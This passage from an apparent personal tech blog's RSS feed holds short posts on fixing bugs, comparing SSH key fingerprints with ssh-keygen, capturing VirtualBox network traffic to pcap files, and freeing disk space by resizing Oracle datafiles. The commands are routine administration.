<p>You can find more details on querying DynamoDB on the AWS official docs: <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Query.html">Working with Queries in DynamoDB</a></p>]]></content></item><item><title>Reflection - Bug fixing</title><link>https://ruben-rodriguez.github.io/posts/bug-fixing/</link><pubDate>Fri, 12 Feb 2021 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/bug-fixing/</guid><description>&lt;p&gt;We usually are scared of bugs. We tend to avoid looking into any fixing activity, and that&amp;rsquo;s one of the main reasons they usually stick to the end of our project backlogs. However, ever since I started my professional career, I have realized that, most of the times, working on fixing something turns out in many different positive outcomes.&lt;/p&gt;
&lt;h2 id="rewarding"&gt;Rewarding&lt;/h2&gt;
&lt;p&gt;Heard about that cool new application that was deployed some time ago so we could get a nice understanding of what we are doing (or at least, improve our lack of complete understanding)? Nice. It&amp;rsquo;s now broken.&lt;/p&gt;</description><content type="html"><![CDATA[<p>We usually are scared of bugs. We tend to avoid looking into any fixing activity, and that&rsquo;s one of the main reasons they usually stick to the end of our project backlogs. However, ever since I started my professional career, I have realized that, most of the times, working on fixing something turns out in many different positive outcomes.</p>
<h2 id="rewarding">Rewarding</h2>
<p>Heard about that cool new application that was deployed some time ago so we could get a nice understanding of what we are doing (or at least, improve our lack of complete understanding)? Nice. It&rsquo;s now broken.</p>
<p>As humans, we tend to look always forward to some sort of recognition or reward from what we do, no matter if it&rsquo;s on our job or in life (that&rsquo;s why some marketing strategies work out so well without much effort). However, this is exactly what you get when you spend some time trying to solve something which was working fine and now decided to stop working. Not only from your colleagues or whoever was consuming the broken thing, but also you feel more powerful after fixing the thing, almost like reaching the nirvana.</p>
<h2 id="knowleadge-gains">Knowleadge Gains</h2>
<p>Like going to the Gym to train our muscles, fixing bugs, which usually involves troubleshooting, is a good way to train our skills.</p>
]]></content></item><item><title>Checking SSH key fingerprints</title><link>https://ruben-rodriguez.github.io/posts/checking-ssh-fingerprints/</link><pubDate>Thu, 05 Mar 2020 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/checking-ssh-fingerprints/</guid><description>&lt;p&gt;SSH key rotation is something real, so, sometime in the future you might get hit by a mail //kindly// asking you to rotate or recreate your SSH key. Let&amp;rsquo;s note down a useful command to compare SSH keys.&lt;/p&gt;</description><content type="html"><![CDATA[<p>SSH key rotation is something real, so, sometime in the future you might get hit by a mail //kindly// asking you to rotate or recreate your SSH key. Let&rsquo;s note down a useful command to compare SSH keys.</p>
<p>So you get this notification email referring to a SSH key you have configured in your GitHub account. I usually stored multiple SSH keys for different purposes in my <code>~/.ssh</code> directory (I know, I might not be supposed to do it this way!), hence need to identify which key it is corresponding when I&rsquo;m dumb enough to not properly name the key pair.</p>
<p>From GitHub we can see more information regarding this key, like the last time it was used <!-- raw HTML omitted -->AND<!-- raw HTML omitted --> the SSH key fingerprint (follows two examples retrieved in different GitHub versions):</p>
<p><img src="/img/posts/ssh-key-fingerprints/ssh-key-fingerprints0.png" alt="">
<img src="/img/posts/ssh-key-fingerprints/ssh-key-fingerprints1.png" alt=""></p>
<p>Now, we can check through our <code>~/.ssh</code> folder public keys for such finger prints:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ ssh-keygen -l -E md5 -f ~/.ssh/test-key.pub 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4096</span> MD5:c3:d3:6d:26:4e:be:fd:c1:dc:17:98:cd:a2:32:a2:e3 test@test.com <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ ssh-keygen -l -f ~/.ssh/test-key.pub
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4096</span> SHA256:u4hFc6p02ERfkdZ2tjiVpFJ/SYB7eMMOXZWrurrdRzA test@test.com <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Tada!</p>]]></content></item><item><title>VirtualBox - Network interface tracing</title><link>https://ruben-rodriguez.github.io/posts/virtualbox-network-tracing/</link><pubDate>Thu, 05 Mar 2020 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/virtualbox-network-tracing/</guid><description>&lt;p&gt;Sometimes we use VirtualBox to run services, applications or even malware.
In VirtualBox, it is possible to trace all network traffic of an interface to a file.&lt;/p&gt;</description><content type="html"><![CDATA[<p>Sometimes we use VirtualBox to run services, applications or even malware.
In VirtualBox, it is possible to trace all network traffic of an interface to a file.</p>
<p>All the following commands are run in Windows.
Tracing can be enable executing the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>VBoxManage modifyvm [your-vm] --nictrace[adapter-number] on --nictracefile[adapter-number] file.pcap
</span></span></code></pre></div><p>Afterwards, virtual machine can be started like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>VirtualBox -startvm [your-vm]
</span></span></code></pre></div><p>To disable tracing, execute the following commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>VBoxManage modifyvm [your-vm] --nictrace1 off
</span></span></code></pre></div><p>Some real examples run in Windows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Program Files\Oracle\VirtualBox&gt; .\VBoxManage.exe modifyvm [your-vm] --nictrace1 on --nictracefile1 file.pcap
</span></span><span style="display:flex;"><span>C:\Program Files\Oracle\VirtualBox&gt; .\VBoxManage.exe modifyvm [your-vm] --nictrace1 off
</span></span></code></pre></div><p>Very useful when running exeperiments on VMs!</p>]]></content></item><item><title>Oracle DB - Freeing up space</title><link>https://ruben-rodriguez.github.io/posts/oracle-dbf-resize/</link><pubDate>Wed, 05 Feb 2020 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/oracle-dbf-resize/</guid><description>&lt;p&gt;Quick note on how to identify Oracle Datafiles subject to resize and save some spaces.
This is intended for testing machines where there are &lt;em&gt;usually&lt;/em&gt; limitations in terms of disk space.&lt;/p&gt;</description><content type="html"><![CDATA[<p>Quick note on how to identify Oracle Datafiles subject to resize and save some spaces.
This is intended for testing machines where there are <em>usually</em> limitations in terms of disk space.</p>
<p>In order to free up space in our beloved DB server, we might wish to resize some dbf&rsquo;s eating lots of space.
Let&rsquo;s identify the dbf&rsquo;s we can shrink with the following SQL query:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> FILE_NAME,
</span></span><span style="display:flex;"><span>CEIL( (NVL(HWM,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8192</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> ) SHRINK_TO,
</span></span><span style="display:flex;"><span>CEIL( BLOCKS<span style="color:#f92672">*</span><span style="color:#ae81ff">8192</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span>) CURRENT_SIZE,
</span></span><span style="display:flex;"><span>CEIL( BLOCKS<span style="color:#f92672">*</span><span style="color:#ae81ff">8192</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span>) <span style="color:#f92672">-</span>
</span></span><span style="display:flex;"><span>CEIL( (NVL(HWM,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8192</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span> ) SAVINGS
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> DBA_DATA_FILES A,
</span></span><span style="display:flex;"><span>( <span style="color:#66d9ef">SELECT</span> FILE_ID, <span style="color:#66d9ef">MAX</span>(BLOCK_ID<span style="color:#f92672">+</span>BLOCKS<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) HWM
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> DBA_EXTENTS
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GROUP</span> <span style="color:#66d9ef">BY</span> FILE_ID ) B
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> A.FILE_ID <span style="color:#f92672">=</span> B.FILE_ID(<span style="color:#f92672">+</span>);
</span></span></code></pre></div><p>This will return a resultset like the following:</p>
<table>
  <thead>
      <tr>
          <th>FILE_NAME</th>
          <th>SHRINK_TO</th>
          <th>CURRENT_SIZE</th>
          <th>SAVINGS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/dir/Datafile_name0.dbf</td>
          <td>3,390</td>
          <td>3,622</td>
          <td>232</td>
      </tr>
      <tr>
          <td>/dir/Datafile_name1.dbf</td>
          <td>2,180</td>
          <td>2,180</td>
          <td>83</td>
      </tr>
      <tr>
          <td>/dir/Datafile_name2.dbf</td>
          <td>1,136</td>
          <td>1,136</td>
          <td>65</td>
      </tr>
  </tbody>
</table>
<p>Once we identify a datafile that is subject to save us some space, let&rsquo;s resize it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">ALTER</span> <span style="color:#66d9ef">DATABASE</span> DATAFILE <span style="color:#e6db74">&#39;/dir/Datafile_name0.dbf&#39;</span> RESIZE <span style="color:#ae81ff">3390</span>m;
</span></span></code></pre></div><p>Voila ~ ! We just saved 232m :)</p>
<blockquote>
<p>NOTE: you will probably need DBA/SYSTEM privileges to perform above operations.</p>
</blockquote>]]></content></item></channel></rss>